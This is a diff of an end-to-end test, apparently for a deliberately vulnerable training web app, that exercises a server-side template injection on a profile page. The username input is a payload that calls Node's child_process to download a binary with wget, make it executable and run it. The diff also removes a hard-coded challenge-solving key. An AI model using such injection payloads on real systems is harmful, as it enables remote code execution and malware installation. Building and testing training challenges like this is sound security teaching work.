@@ -15,9 +15,8 @@ describe('/profile', () => {
       browser.waitForAngularEnabled(false)
       username = element(by.id('username'))
       submitButton = element(by.id('submit'))
-      username.sendKeys('#{root.process.mainModule.require(\'child_process\').exec(\'wget http://link-to-malware.co && chmod +x malware && ./malware\')}')
+      username.sendKeys('#{root.process.mainModule.require(\'child_process\').exec(\'wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware\')}')
       submitButton.click()
-      browser.get('/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3') // Until malware is ready
       browser.get('/')
       browser.driver.sleep(5000)
     })
